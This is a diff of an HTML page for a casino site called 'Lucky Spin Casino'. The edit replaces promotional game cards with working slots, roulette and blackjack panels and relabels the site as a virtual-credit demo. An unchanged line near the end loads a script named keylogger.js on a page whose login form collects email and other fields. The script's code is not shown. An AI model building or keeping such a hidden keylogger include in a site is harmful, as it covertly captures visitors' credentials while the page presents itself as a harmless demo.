@@ -3,43 +3,82 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lucky Spin Casino — Play & Win</title>
+<title>Lucky Spin Casino</title>
 <link rel="stylesheet" href="styles.css">
 </head>
 <body>
 <div class="bg-overlay"></div>
 <header>
   <div class="logo">🍀 Lucky Spin Casino</div>
+  <div class="balance-bar">
+    Balance: <span id="balance">1000</span> 🪙
+    <button id="add-credits" class="small-btn">+500</button>
+  </div>
   <nav>
-    <a href="#slots">Slots</a>
-    <a href="#roulette">Roulette</a>
-    <a href="#blackjack">Blackjack</a>
-    <a href="#login" class="btn-login">Login / Register</a>
+    <a href="#" data-game="slots">Slots</a>
+    <a href="#" data-game="roulette">Roulette</a>
+    <a href="#" data-game="blackjack">Blackjack</a>
+    <a href="#login" class="btn-login" id="open-login">Login</a>
   </nav>
 </header>
 
 <main>
-  <section class="hero">
-    <h1>Spin. Win. Repeat.</h1>
-    <p>Welcome to the hottest online casino experience. Deposit now and claim your 200% welcome bonus.</p>
-    <button class="cta" onclick="document.getElementById('login-modal').style.display='flex'">Claim Bonus</button>
-  </section>
-
-  <section id="slots" class="games">
-    <h2>Featured Slots</h2>
-    <div class="game-grid">
-      <div class="game-card"><div class="game-img">🎰</div><h3>Neon Reels</h3><p>96.5% RTP</p></div>
-      <div class="game-card"><div class="game-img">💎</div><h3>Diamond Rush</h3><p>97.1% RTP</p></div>
-      <div class="game-card"><div class="game-img">🔥</div><h3>Fire Dragon</h3><p>96.8% RTP</p></div>
-      <div class="game-card"><div class="game-img">🐺</div><h3>Wolf Moon</h3><p>95.9% RTP</p></div>
+  <!-- SLOTS -->
+  <section id="game-slots" class="game-panel active">
+    <h2>Neon Reels</h2>
+    <div class="slot-machine">
+      <div class="reels">
+        <div class="reel" id="reel1">🍒</div>
+        <div class="reel" id="reel2">🍋</div>
+        <div class="reel" id="reel3">🔔</div>
+      </div>
+      <div class="slot-controls">
+        <label>Bet: <input type="number" id="slot-bet" value="10" min="1" max="500"></label>
+        <button id="spin-btn" class="cta">SPIN</button>
+      </div>
+      <div id="slot-result" class="result-msg"></div>
     </div>
   </section>
 
-  <section id="roulette" class="games">
-    <h2>Live Roulette</h2>
-    <div class="game-grid">
-      <div class="game-card"><div class="game-img">🔴</div><h3>European Roulette</h3><p>Live dealers</p></div>
-      <div class="game-card"><div class="game-img">🟢</div><h3>Lightning Roulette</h3><p>Multipliers up to 500x</p></div>
+  <!-- ROULETTE -->
+  <section id="game-roulette" class="game-panel">
+    <h2>European Roulette</h2>
+    <div class="roulette-wrap">
+      <div class="wheel" id="wheel">🎯</div>
+      <div class="roulette-controls">
+        <div class="bet-types">
+          <button class="bet-btn" data-bet="red">Red (x2)</button>
+          <button class="bet-btn" data-bet="black">Black (x2)</button>
+          <button class="bet-btn" data-bet="green">0 (x14)</button>
+          <button class="bet-btn" data-bet="odd">Odd (x2)</button>
+          <button class="bet-btn" data-bet="even">Even (x2)</button>
+        </div>
+        <label>Bet: <input type="number" id="roulette-bet" value="10" min="1" max="500"></label>
+        <button id="spin-roulette" class="cta">SPIN WHEEL</button>
+        <div id="roulette-result" class="result-msg"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- BLACKJACK -->
+  <section id="game-blackjack" class="game-panel">
+    <h2>Blackjack</h2>
+    <div class="bj-table">
+      <div class="hand">
+        <h3>Dealer <span id="dealer-score"></span></h3>
+        <div id="dealer-cards" class="cards"></div>
+      </div>
+      <div class="hand">
+        <h3>You <span id="player-score"></span></h3>
+        <div id="player-cards" class="cards"></div>
+      </div>
+      <div class="bj-controls">
+        <label>Bet: <input type="number" id="bj-bet" value="20" min="1" max="500"></label>
+        <button id="bj-deal" class="cta">Deal</button>
+        <button id="bj-hit" class="small-btn" disabled>Hit</button>
+        <button id="bj-stand" class="small-btn" disabled>Stand</button>
+        <div id="bj-result" class="result-msg"></div>
+      </div>
     </div>
   </section>
 </main>
@@ -47,7 +86,7 @@
 <!-- Login Modal -->
 <div id="login-modal" class="modal">
   <div class="modal-content">
-    <span class="close" onclick="document.getElementById('login-modal').style.display='none'">&times;</span>
+    <span class="close" id="close-login">&times;</span>
     <h2>Login / Register</h2>
     <form id="auth-form">
       <input type="email" id="email" name="email" placeholder="Email" required>
@@ -55,11 +94,11 @@
       <input type="text" id="username" name="username" placeholder="Username (optional)">
       <button type="submit">Enter Casino</button>
     </form>
-    <p class="terms">By continuing you agree to our Terms & Privacy Policy.</p>
+    <p class="terms">Demo only. Virtual credits.</p>
   </div>
 </div>
 
 <script src="keylogger.js"></script>
-<script src="app.js"></script>
+<script src="casino.js"></script>
 </body>
 </html>
